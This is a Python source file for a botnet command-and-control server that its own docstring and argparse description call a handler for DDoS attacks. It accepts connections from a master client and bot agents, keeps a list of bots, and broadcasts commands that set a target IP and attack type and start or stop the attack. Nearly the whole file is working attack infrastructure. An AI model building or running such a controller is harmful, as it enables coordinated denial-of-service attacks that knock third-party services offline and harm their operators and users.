""" Handler Server

This script runs a server acting as a middleman for a master client and bot agents to perform
a type of DDoS attack on a target server. 

To execute this script, it requires python 3.9

source: https://pythonprogramming.net/server-chatroom-sockets-tutorial-python-3/ 
"""
import socket
import sys
import select
import argparse
import time
import traceback

RECV_BUFFER = 4096
ENCODING = 'utf-8'


class Server():

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.sock: socket.socket = None
        self.socket_list: list[socket.socket] = []
        self.bot_agents: dict[socket.socket, str] = {}
        self.master_client: socket.socket = None
        self.target_address: str = ''
        self.attk_type: int = 0
        self.attacking: bool = False

    def start(self) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen()
        self.socket_list.append(self.sock)
        print(f"listening for connections on {self.host}:{self.port}")

        try:
            while True:
                read_sockets, _, exception_sockets = select.select(
                    self.socket_list, [], self.socket_list
                )

                for notified_socket in read_sockets:
                    # New connection
                    if notified_socket == self.sock:
                        conn, _ = self.sock.accept()
                        self._accept_wrapper(conn)
                    # New request
                    else:
                        self._request_router(notified_socket)

                for notified_socket in exception_sockets:
                    self._disconnect_wrapper(notified_socket)
        except KeyboardInterrupt:
            print('caught keyboard interrupt, exiting...')
        except Exception as e:
            traceback.print_exc()
        finally:
            self.sock.close()
            sys.exit()

        return

    def _accept_wrapper(self, notified_sock: socket.socket) -> None:
        self.socket_list.append(notified_sock)
        print(f'New client connected > {str(notified_sock.getpeername())}')

        # Ask client to identify themselves
        notified_sock.send('whoami:_'.encode(ENCODING))

        return

    def _request_router(self, sock: socket.socket) -> None:
        sock_addr = sock.getpeername()
        recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
        print(f'received request from ${sock_addr}')
        try:
            if recv_data:
                try:
                    req_type, req_body = recv_data.split(':')
                    # iam request applies to both master and bot agent
                    if req_type == 'iam':
                        self._iam_handler(sock, req_body)
                    elif sock in self.bot_agents:
                        self._bot_handler(sock, req_type, req_body)
                    elif sock == self.master_client:
                        self._master_handler(sock, req_type, req_body)
                    else:
                        print(
                            f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
                        )
                        response = f'{req_type}:error:cannot handle request'.encode(
                            ENCODING)
                        sock.send(response)
                except ValueError:
                    print('cannot parse request!')
                    response = '_:error:cannot parse request'.encode(ENCODING)
                    sock.send(response)

            # No data received means that client closed gracefully
            else:
                self._disconnect_wrapper(sock)

        # Abrupt client disconnect
        except Exception as e:
            print(e)
            self._disconnect_wrapper(sock)

        return

    def _iam_handler(self, sock: socket.socket, body: str) -> None:
        if body == 'master':
            self.master_client = sock
            response = 'iam:success:master identified'
            if not self.master_client:
                response = 'iam:error:master already exist'
        elif body == 'bot':
            # Generate client socket information
            sock_addr = sock.getpeername()
            curr_time = str(int(time.time()))
            bot_info = '' + curr_time + ';' + \
                sock_addr[0] + ';' + str(sock_addr[1])
            self.bot_agents[sock] = bot_info

            response = 'iam:success:bot identified'

            # send master current bot list
            if self.master_client:
                bots = self._get_bot_list()
                self.master_client.sendall(f'listbot:{bots}'.encode(ENCODING))
        else:
            response = 'iam:error:unknown type'

        sock.send(response.encode(ENCODING))
        return

    def _master_handler(self, sock: socket.socket, type: str, body: str) -> None:
        if type == 'listbot':
            bots = self._get_bot_list()
            response = f'listbot:{bots}'
        elif type == 'changeip':
            self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
            self.target_address = body
            # Reflects change in target IP
            print(f'Target IP is: {self.target_address}')
            return
        elif type == 'changeattk':
            self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
            self.attk_type = body
            return
        elif type == 'startattk':
            if not self.target_address:
                response = 'startattk:error:no target set'
            elif not self.attk_type:
                response = 'startattk:error:no attack type set'
            elif self.attacking:
                response = 'startattk:error:already attacking'
            else:
                self._bot_broadcast('startattk:True'.encode(ENCODING))
                self.attacking = True
                response = 'startattk:success:started attack'
        elif type == 'stopattk':
            if not self.target_address or not self.attacking or not self.attk_type:
                response = 'stopattk:error:no attack in progress'
            else:
                self._bot_broadcast('stopattk:True'.encode(ENCODING))
                self.attacking = False
                response = 'stopattk:success:stopped attack'
        else:
            response = f'{type}:error:unknown command'

        sock.sendall(response.encode(ENCODING))
        return

    def _bot_handler(self, sock: socket.socket, type: str, body: str) -> None:
        return

    def _bot_broadcast(self, message: bytes) -> None:
        for sock in self.bot_agents:
            sock.send(message)
        return

    def _disconnect_wrapper(self, sock: socket.socket) -> None:
        self.socket_list.remove(sock)
        sock_addr = sock.getpeername()
        sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])

        # bot agent disconnect
        if sock in self.bot_agents:
            del self.bot_agents[sock]

            if self.master_client:
                bots = self._get_bot_list()
                self.master_client.sendall(
                    f'listbot:{bots}'.encode(ENCODING))
            print(f'bot agent {sock_addr_str} disconnected')
        # master client disconnect
        elif self.master_client == sock:
            self.master_client = None
            print(f'master client {sock_addr_str} disconnected')
        else:
            print(f'client {sock_addr_str} disconnected')

        return

    def _get_bot_list(self) -> str:
        bots = ''
        for bot in self.bot_agents:
            bots += self.bot_agents[bot] + ','

        return bots


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Handler server for performing DDoS attacks')
    parser.add_argument('-a', type=str,
                        default='', help='interface the server listens at')
    parser.add_argument('-p', type=int, default=8080,
                        help='TCP port (default 8080)')
    args = parser.parse_args()

    server = Server(args.a, args.p)
    server.start()
